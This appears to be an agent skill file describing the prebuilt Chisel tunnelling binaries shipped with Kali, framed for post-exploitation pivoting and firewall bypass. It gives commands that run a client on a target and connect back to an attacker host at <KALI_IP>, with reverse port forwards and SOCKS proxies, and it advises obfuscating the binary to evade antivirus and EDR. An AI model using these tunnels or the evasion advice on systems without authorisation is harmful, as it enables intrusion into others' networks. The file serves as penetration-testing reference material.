---
name: chisel-common-binaries
description: Access prebuilt binaries for Chisel, a fast TCP/UDP tunnel transported over HTTP and secured via SSH. Use when performing network pivoting, bypassing firewalls, or establishing secure tunnels into a target network during post-exploitation and lateral movement.
---

# chisel-common-binaries

## Overview
This package provides prebuilt binaries for Chisel, a single-executable tool that functions as both a client and a server. It creates a secure TCP/UDP tunnel over HTTP, making it highly effective for bypassing restrictive firewalls and performing network pivoting. Category: Post-Exploitation / Exploitation.

## Installation (if not already installed)
The binaries are stored in a shared directory. To install the package:

```bash
sudo apt update && sudo apt install chisel-common-binaries
```

## Common Workflows

### Accessing the Binaries
The binaries for various operating systems and architectures are located in `/usr/share/chisel-common-binaries/`. You can copy the required version to your working directory or host them for a target to download.

```bash
ls /usr/share/chisel-common-binaries/
cp /usr/share/chisel-common-binaries/chisel_1.11.3_windows_amd64.exe ./chisel.exe
```

### Basic Reverse Port Forward (Server on Kali)
1. Start the server on your Kali machine:
```bash
chisel server -p 8080 --reverse
```
2. Run the client on the target (e.g., Linux amd64):
```bash
./chisel_1.11.3_linux_amd64 client <KALI_IP>:8080 R:80:127.0.0.1:80
```
This forwards the target's local port 80 to your Kali machine's port 80.

### SOCKS5 Proxy for Pivoting
1. Start the server on Kali:
```bash
chisel server -p 8080 --reverse
```
2. Run the client on the target:
```bash
./chisel_1.11.3_linux_amd64 client <KALI_IP>:8080 R:socks
```
This opens a SOCKS5 proxy on your Kali machine (default port 1080) that tunnels traffic through the target.

## Complete Command Reference

The `chisel-common-binaries` command itself is a helper script to list the available prebuilt binaries.

### Available Binaries in `/usr/share/chisel-common-binaries/`

| Filename | Platform | Architecture |
|----------|----------|--------------|
| `chisel_1.11.3_darwin_amd64` | macOS | x86_64 |
| `chisel_1.11.3_darwin_arm64` | macOS | ARM64 |
| `chisel_1.11.3_linux_386` | Linux | i386 |
| `chisel_1.11.3_linux_amd64` | Linux | x86_64 |
| `chisel_1.11.3_linux_arm64` | Linux | ARM64 |
| `chisel_1.11.3_openbsd_386` | OpenBSD | i386 |
| `chisel_1.11.3_openbsd_amd64` | OpenBSD | x86_64 |
| `chisel_1.11.3_openbsd_arm64` | OpenBSD | ARM64 |
| `chisel_1.11.3_windows_386.exe` | Windows | i386 |
| `chisel_1.11.3_windows_amd64.exe` | Windows | x86_64 |
| `chisel_1.11.3_windows_arm64.exe` | Windows | ARM64 |

### Chisel Global Options
*Note: These apply to the individual binaries listed above.*

| Flag | Description |
|------|-------------|
| `-v` | Enable verbose logging |
| `--help`, `-h` | Show help for a command |

### Server Subcommand (`chisel server [options]`)

| Flag | Description |
|------|-------------|
| `--host <addr>` | Interface to bind to (default: 0.0.0.0) |
| `-p, --port <port>` | Port to listen on (default: 8080) |
| `--key <key>` | AES-256 key for encryption |
| `--authfile <file>` | JSON file containing user credentials |
| `--auth <user:pass>` | Single user credentials |
| `--socks5` | Enable SOCKS5 proxy (on server-side) |
| `--reverse` | Allow clients to specify reverse port forwarding |
| `--tls-key <file>` | Path to TLS private key |
| `--tls-cert <file>` | Path to TLS certificate |
| `--tls-domain <name>`| Domain name for TLS |

### Client Subcommand (`chisel client [options] <server> <remote> [remote]...`)

| Flag | Description |
|------|-------------|
| `--fingerprint <hash>`| Expected server TLS certificate fingerprint |
| `--auth <user:pass>` | Credentials for server authentication |
| `--keepalive <time>` | Interval between keep-alive packets (default: 25s) |
| `--max-retry-count` | Max number of times to retry connection |
| `--max-retry-interval`| Max time between retries |
| `--proxy <url>` | Use an HTTP proxy for the connection |
| `--header <h:v>` | Set custom HTTP headers |
| `--hostname <name>` | Set custom Host header |
| `--tls-skip-verify` | Skip TLS certificate verification |

## Notes
- Chisel is often flagged by AV/EDR; consider obfuscation or using the source to recompile if the prebuilt binaries are blocked.
- The `--reverse` flag is essential on the server if you intend to use `R:port` or `R:socks` on the client.
- Use `chisel-common-binaries -h` to quickly see the list of available paths on your system.